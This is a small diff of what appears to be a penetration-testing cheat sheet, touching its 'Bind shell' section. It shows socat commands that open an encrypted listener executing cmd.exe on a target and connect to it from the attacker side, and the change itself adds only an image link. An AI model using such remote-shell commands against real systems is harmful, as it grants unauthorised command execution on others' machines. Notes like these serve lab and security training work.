@@ -87,6 +87,6 @@ Bind shell
 Target:
 `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`  
 Attacker:
-`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`
-
+`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`  
+<img src="https://user-images.githubusercontent.com/73976100/222943648-ca52adef-2048-4429-b36b-6c8b3942cba3.png">  
 
